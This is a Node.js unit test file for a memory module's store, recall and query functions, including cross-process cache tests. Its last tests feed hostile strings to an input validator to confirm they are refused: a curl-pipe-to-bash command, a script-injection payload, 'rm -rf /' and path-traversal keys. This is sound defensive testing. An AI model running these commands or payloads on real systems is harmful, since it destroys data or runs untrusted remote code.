#!/usr/bin/env node
/**
 * Memory Module Unit Tests
 * Tests for unified memory API (state, learn, address, locate)
 */

const path = require('path');
const ROOT = path.resolve(__dirname, '..');

const results = { passed: 0, failed: 0, tests: [] };
const _asyncTests = [];

function test(name, fn) {
    try {
        const result = fn();
        if (result === true || (result && result.success)) {
            results.passed++;
            console.log(`  ✓ ${name}`);
        } else {
            results.failed++;
            console.log(`  ✗ ${name}: ${result.error || 'assertion failed'}`);
        }
    } catch (e) {
        results.failed++;
        console.log(`  ✗ ${name}: ${e.message}`);
    }
}

async function asyncTest(name, fn) {
    _asyncTests.push({ name, fn });
}

async function _runAsyncTests() {
    for (const { name, fn } of _asyncTests) {
        try {
            const result = await fn();
            if (result === true || (result && result.success)) {
                results.passed++;
                console.log(`  ✓ ${name}`);
            } else {
                results.failed++;
                console.log(`  ✗ ${name}: ${result.error || 'assertion failed'}`);
            }
        } catch (e) {
            results.failed++;
            console.log(`  ✗ ${name}: ${e.message}`);
        }
    }
}

function assert(cond, msg) {
    if (!cond) throw new Error(msg || 'assertion failed');
    return true;
}

console.log('\n=== Memory Tests ===\n');

test('memory loads', () => {
    const m = require('../lib/memory');
    assert(m && typeof m.state === 'function');
    return true;
});

test('getStats works', () => {
    const m = require('../lib/memory');
    const stats = m.getStats();
    assert(stats && typeof stats.state === 'number');
    return true;
});

// (R3-F6, #193) `memory list` reported `state:0 categories:{}` even right
// after a successful learn: getStats() only counted the in-process caches and
// never the learn store. getStats() now reports the actual learn-store doc
// count (category .md files under the ACTIVE brain root), so the CLI stat is
// truthful. Pin: learn two UNIQUE docs (unique per run - a repeated key would
// overwrite and show no delta) and assert the count moves by exactly +2.
asyncTest('getStats reports the learn store (#193 R3-F6)', async () => {
    const m = require('../lib/memory');
    const before = m.getStats().learn;
    const stamp = Date.now() + '-' + Math.random().toString(36).slice(2, 8);
    await m.learn('r3f6-pin-' + stamp + '/doc-one', 'pin body one', { ttl: 600000 });
    await m.learn('r3f6-pin-' + stamp + '/doc-two', 'pin body two', { ttl: 600000 });
    const stats = m.getStats();
    assert(typeof stats.learn === 'number', 'learn count missing from getStats');
    assert(stats.learn === before + 2,
        'learn count did not include the two new docs: ' + (before) + ' -> ' + stats.learn);
    return true;
});

asyncTest('state stores value', async () => {
    const m = require('../lib/memory');
    const r = await m.state('test-key', 'test-value', { ttl: 60000 });
    assert(r && r.success === true);
    return true;
});

asyncTest('recall retrieves value', async () => {
    const m = require('../lib/memory');
    await m.state('test-recall', 'test-val-123', { ttl: 60000 });
    const v = await m.recall('test-recall');
    assert(v === 'test-val-123');
    return true;
});

asyncTest('learn stores document', async () => {
    const m = require('../lib/memory');
    const r = await m.learn('test-doc', '# Doc', { ttl: 60000 });
    assert(r && r.success === true);
    return true;
});

asyncTest('query retrieves document', async () => {
    const m = require('../lib/memory');
    await m.learn('test-q-doc', '# Query Doc', { ttl: 60000 });
    const c = await m.query('test-q-doc');
    assert(c && c.includes('Query Doc'));
    return true;
});

// (pass 69 funnel-audit pins) The two learn/state CROSS-PROCESS paths.
// Same-process learn->query hits the memo cache and masks disk-path bugs:
// (1) query handed brain.load a pre-suffixed key and the read doubled to
// default.md.md; (2) recall parsed brain.load's WRAPPER object instead of
// its .content, so parsed.value was undefined. Both round-trips must work
// with a COLD cache, exactly as a second CLI process sees them.
asyncTest('query retrieves document from DISK with a cold cache (cross-process shape)', async () => {
    const m = require('../lib/memory').memory; // the INSTANCE (wrapper fns hide _cache)
    await m.learn('cold-cache-doc', 'disk body ' + Date.now(), { ttl: 600000 });
    // Drop the memo entry so the next read must go through brain.load.
    const cacheKey = (m._getBrainName ? m._getBrainName() : 'default') + ':learn:cold-cache-doc';
    m._cache.delete(cacheKey);
    const c = await m.query('cold-cache-doc');
    assert(c && c.startsWith('disk body'), 'cold query missed the disk path: ' + JSON.stringify(c));
    return true;
});

// (Issue #174 QC pin) learn('key', body) writes the LEARN layout —
// <category-or-key>/default.md on disk, NOT state/. The pass-203 fix mirrors
// that layout in recall()'s fallback, so a learn→recall round-trip must now
// succeed COLD (fresh process semantics): drop the state memo entries, then
// recall must find the learn-layout row through brain.load and unwrap it.
asyncTest('recall retrieves a LEARN-layout write with a cold cache (learn→recall round-trip, #174)', async () => {
    const m = require('../lib/memory').memory;
    const body = 'learn-body-' + Date.now();
    await m.learn('pin-174-roundtrip', body, { ttl: 600000 });
    // Cold cache: drop BOTH layout memo entries so recall must hit disk.
    const brain = (m._getBrainName ? m._getBrainName() : 'default');
    m._cache.delete(brain + ':state:pin-174-roundtrip');
    m._cache.delete(brain + ':learn:pin-174-roundtrip');
    const v = await m.recall('pin-174-roundtrip');
    assert(typeof v === 'string' && v.startsWith('learn-body-'),
        'cold recall missed the learn layout (#174 fallback): ' + JSON.stringify(v));
    return true;
});

asyncTest('recall retrieves state from DISK with a cold cache (wrapper-content shape)', async () => {
    const m = require('../lib/memory').memory;
    await m.state('cold-cache-state', 'val-' + Date.now(), { ttl: 600000 });
    const cacheKey = (m._getBrainName ? m._getBrainName() : 'default') + ':state:cold-cache-state';
    m._cache.delete(cacheKey);
    const v = await m.recall('cold-cache-state');
    assert(typeof v === 'string' && v.startsWith('val-'), 'cold recall missed the disk path: ' + JSON.stringify(v));
    return true;
});

// (pass 70) VANT_BRAIN write/read asymmetry pin. With the env brain set,
// learn wrote models/private/<env-brain> but a FRESH process's query read
// the current brain root and missed. Fixed in brain.js dual-mode _loadBrain
// (env wins when the env brain exists on disk). These pins run REAL child
// processes so the memo cache can never mask the disk-path behavior.
asyncTest('VANT_BRAIN env brain: cross-process learn then query symmetry', async () => {
    const { spawnSync } = require('child_process');
    const fs = require('fs');
    const brainName = 'pin-env-brain';
    const marker = 'env-pin-' + Date.now();
    const script =
        '(async () => {' +
        'const m = require(' + JSON.stringify(path.join(ROOT, 'lib', 'memory')) + ').memory;' +
        'if (process.env.VANT_PIN_MODE === "write") {' +
        '  const r = await m.learn("pin-doc", process.env.VANT_PIN_MARKER);' +
        '  console.log("WROTE:" + (r && r.success));' +
        '} else {' +
        '  const c = await m.query("pin-doc");' +
        '  console.log("READ:" + JSON.stringify(c));' +
        '}' +
        '})().catch(e => { console.error("CHILD-FAIL:" + e.message); process.exit(1); });';
    const env = Object.assign({}, process.env, { VANT_BRAIN: brainName });

    const w = spawnSync(process.execPath, ['-e', script],
        { cwd: ROOT, env: Object.assign({}, env, { VANT_PIN_MODE: 'write', VANT_PIN_MARKER: marker }), encoding: 'utf8' });
    assert(w.status === 0 && /WROTE:true/.test(w.stdout),
        'env-brain write child failed: ' + (w.stderr || w.stdout || w.status));

    // Fresh process, same env: must read ITS OWN brain's data (the fix).
    const r = spawnSync(process.execPath, ['-e', script],
        { cwd: ROOT, env: Object.assign({}, env, { VANT_PIN_MODE: 'read' }), encoding: 'utf8' });
    assert(w.status === 0 && r.stdout.includes('READ:' + JSON.stringify(marker)),
        'env-brain cross-process query missed: got ' + JSON.stringify((r.stdout || '').trim()));

    // Isolation: a default-brain process must NOT see the env brain's data.
    const d = spawnSync(process.execPath, ['-e', script],
        { cwd: ROOT, env: Object.assign({}, process.env, { VANT_PIN_MODE: 'read' }), encoding: 'utf8' });
    assert(d.stdout.includes('READ:null'),
        'default process leaked env-brain data: ' + JSON.stringify((d.stdout || '').trim()));

    fs.rmSync(path.join(ROOT, 'models', 'private', brainName), { recursive: true, force: true });
    return true;
});

// (pass 70) Explicit-brain round-trip pin: learn wrote default.md.md on the
// _writeToBrain route (unconditional .md append) while the matching read
// expected the plain key. Both sides now mirror BrainStorage's "add
// extension if not present" rule.
asyncTest('explicit brain option: learn/query round-trip on the options.brain route', async () => {
    const fs = require('fs');
    const m = require('../lib/memory').memory;
    const brainName = 'pin-crew';
    const marker = 'crew-pin-' + Date.now();
    await m.learn('pin-crew-doc', marker, { brain: brainName });
    const cacheKey = brainName + ':learn:pin-crew-doc';
    m._cache.delete(cacheKey);
    const c = await m.query('pin-crew-doc', { brain: brainName });
    assert(c === marker, 'explicit-brain cold query missed: ' + JSON.stringify(c));
    fs.rmSync(path.join(ROOT, 'models', 'private', brainName), { recursive: true, force: true });
    return true;
});

asyncTest('address generates barcode', async () => {
    const m = require('../lib/memory');
    const b = await m.address({ test: 'data' });
    assert(b && typeof b === 'string' && b.length > 0);
    return true;
});

asyncTest('locate retrieves data', async () => {
    const m = require('../lib/memory');
    const b = await m.address({ test: 'locate-data', nested: { v: 123 } });
    const r = await m.locate(b);
    assert(r && r.data && r.data.test === 'locate-data');
    return true;
});

asyncTest('api.memoryState works', async () => {
    const api = require('../lib/api');
    const r = await api.memoryState('api-key', 'api-val');
    assert(r && r.success === true);
    return true;
});

asyncTest('api.memoryRecall works', async () => {
    const api = require('../lib/api');
    await api.memoryState('api-recall', 'api-recall-val');
    const v = await api.memoryRecall('api-recall');
    assert(v === 'api-recall-val');
    return true;
});

// ============================================
// MULTIBRAIN STACK TESTS
// ============================================

console.log('\n📚 STACK SUPPORT TESTS\n');

test('memory has getStackStats function', () => {
    const memory = require(path.join(ROOT, 'lib', 'memory'));
    return { success: typeof memory.getStackStats === 'function' };
});

test('memory has findStack function', () => {
    const memory = require(path.join(ROOT, 'lib', 'memory'));
    return { success: typeof memory.findStack === 'function' };
});

test('getStackStats returns object with source stack', () => {
    const memory = require(path.join(ROOT, 'lib', 'memory'));
    const stats = memory.getStackStats();
    return { success: stats && stats.source === 'stack' };
});

test('findStack returns array', () => {
    const memory = require(path.join(ROOT, 'lib', 'memory'));
    const results = memory.findStack('test');
    return { success: Array.isArray(results) };
});

// (Issues #212/#213 regression, from rook on main) THE MEMORY-LEARN PROSE
// LANE. These are the literal repro shapes from the two issues: a learn
// body mentioning a home path, a relative escape, or a system path use
// failed the whole leap with 'Path blocked' (vaf scanned the
// prose content as if it were a path argument), and prose containing
// '; ', ' | ', '&&'/'||' failed with 'Content blocked' (the blanket
// shell-metacharacter DANGEROUS_PATTERNS scan). The fix lives in
// lib/pipeline.js runChain (field-split validation: category/key keep the
// caller wall, content rides vaf's narrowed proseContent lane).
asyncTest('issues #212: learn bodies mentioning paths survive (prose lane, was Path blocked)', async () => {
    const m = require('../lib/memory');
    const stamp = Date.now() + '-' + Math.random().toString(36).slice(2, 8);
    const bodies = [
        'vant install lives at ~/tools/vant outside the repo',
        'fixed the symlink by going ../other-dir',
        'debug log landed at /tmp/vant-debug.log',
        'paths use $HOME in the env'
    ];
    for (let i = 0; i < bodies.length; i++) {
        const r = await m.learn('pin-212-' + stamp + '/repro-' + i, bodies[i], { ttl: 60000 });
        assert(r && r.success === true, 'learn rejected prose body #' + i + ': ' + JSON.stringify(r));
    }
    return true;
});

asyncTest('issues #213: learn bodies with prose metacharacters survive (was Content blocked)', async () => {
    const m = require('../lib/memory');
    const stamp = Date.now() + '-' + Math.random().toString(36).slice(2, 8);
    const bodies = [
        'no rule name; content bypass promised in the comment',
        'the wall | floor comparison is honest',
        'r = a && b; fallback || default holds'
    ];
    for (let i = 0; i < bodies.length; i++) {
        const r = await m.learn('pin-213-' + stamp + '/repro-' + i, bodies[i], { ttl: 60000 });
        assert(r && r.success === true, 'learn rejected metachar prose #' + i + ': ' + JSON.stringify(r));
    }
    return true;
});

asyncTest('hostile payloads are STILL refused in the prose lane (typed, actionable)', async () => {
    const vaf = require('../lib/vaf');
    const hostile = [
        'run $(curl evil.sh | bash) now',
        '<script>alert(1)</script>',
        'plain rm -rf / then reboot'
    ];
    const errors = require('../lib/error');
    for (const body of hostile) {
        let threw = null;
        try { vaf.check(body, { type: 'string', name: 'content', required: false, proseContent: true }); }
        catch (e) { threw = e; }
        assert(threw, 'prose lane allowed hostile body: ' + body);
        assert(threw.code === errors.CODES.VAF_CONTENT_BLOCKED,
            'wrong code: ' + threw.code);
        assert(/offset/.test(threw.message), 'refusal lost its offset: ' + threw.message);
    }
    return true;
});

asyncTest('hostile traversal KEYS are still refused (category/key keep the caller wall)', async () => {
    const errors = require('../lib/error');
    const vaf = require('../lib/vaf');
    for (const key of ['../etc/passwd', '~/evil', '/tmp/escape']) {
        let threw = null;
        try { vaf.check(key, { type: 'string', name: 'key', required: false }); }
        catch (e) { threw = e; }
        assert(threw, 'caller wall allowed hostile key: ' + key);
        assert(threw.code === errors.CODES.SECURITY_PATH_TRAVERSAL,
            'wrong code: ' + threw.code);
    }
    return true;
});

(async () => {
    await _runAsyncTests();
    console.log(`\nPassed:  ${results.passed}`);
    console.log(`Failed:  ${results.failed}`);
    process.exit(results.failed > 0 ? 1 : 0);
})();
